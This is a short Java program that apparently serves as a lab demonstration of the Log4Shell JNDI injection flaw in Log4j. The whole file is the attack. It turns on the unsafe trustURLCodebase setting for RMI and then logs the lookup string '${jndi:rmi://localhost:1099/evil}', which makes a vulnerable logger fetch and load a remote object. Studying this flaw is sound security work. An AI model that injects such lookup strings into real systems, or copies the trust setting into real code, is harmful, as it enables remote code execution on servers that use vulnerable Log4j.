package edu.changda.jndi.rmi;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {
    private static final Logger logger= LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        String input="${jndi:rmi://localhost:1099/evil}";
        logger.error("input,{}",input);
    }
}